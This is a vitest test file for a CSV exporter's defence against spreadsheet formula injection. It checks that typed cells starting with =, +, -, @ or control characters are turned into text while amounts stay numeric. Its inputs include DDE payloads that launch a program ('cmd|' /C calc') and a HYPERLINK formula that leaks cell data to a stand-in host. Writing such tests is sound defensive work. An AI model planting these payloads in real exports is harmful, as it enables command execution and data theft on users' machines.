// An export is opened in Excel or Sheets, which run any cell that begins with = + - @ (or a tab / line break) as a formula. A party,
// item or narration that someone typed becomes a cell, so the exporter makes those cells text - and leaves real numbers alone.
import { describe, expect, it } from "vitest";
import { neutraliseFormula, toCSV } from "../format";

describe("neutraliseFormula", () => {
  it.each([
    ['=HYPERLINK("http://evil.example/?"&A2,"Open")'],
    ["=1+1"],
    ["+cmd|' /C calc'!A0"],
    ["-2+3*cmd|' /C calc'!A0"],
    ["@SUM(1+1)"],
    ["=cmd|' /C calc'!A0"],
    ["\t=1+1"],
    ["\r=1+1"],
    ["\n=1+1"],
    ["  =1+1"],
    [" =1+1"],
    ["-1+1"],
    ["-AED 5"],
    ["+971 50 123 4567"],
    ["@john"],
  ])("makes %j text", (cell) => {
    const out = neutraliseFormula(cell);
    expect(out).toBe(`'${cell}`);
  });

  it.each([["-1,234.50"], ["-123.45"], ["+5"], ["-.5"], ["-12.5%"], ["1,234.50"], ["0"], ["-0.00"], ["-"], ["--"], ["+"], ["Ordinary text"], ["12 Main St"], [""]])(
    "leaves %j alone",
    (cell) => {
      expect(neutraliseFormula(cell)).toBe(cell);
    }
  );
});

describe("toCSV", () => {
  it("never lets a typed cell start a formula, and keeps the quoting that was already there", () => {
    const csv = toCSV(["Name", "Note"], [['=HYPERLINK("http://evil.example")', "a, b"], ["@SUM(A1)", 'say "hi"']]);
    const lines = csv.split("\r\n");
    expect(lines[1]).toBe(`"'=HYPERLINK(""http://evil.example"")","a, b"`);
    expect(lines[2]).toBe(`"'@SUM(A1)","say ""hi"""`); // the quote mark makes the existing quoting rule wrap it; the reader unwraps it
  });

  it("keeps amounts numeric, negative ones included, whether they arrive as numbers or as formatted text", () => {
    const csv = toCSV(["Debit", "Credit", "Balance"], [[-1250.5, "-1,250.50", "1,250.50 Dr"], [0, 0, null]]);
    const [, first, second] = csv.split("\r\n");
    expect(first).toBe(`-1250.5,"-1,250.50","1,250.50 Dr"`);
    expect(second).toBe("0,0,");
  });

  it("neutralises the headings too (a heading can come from data)", () => {
    expect(toCSV(["=1+1"], [])).toBe(`"'=1+1"`);
  });
});
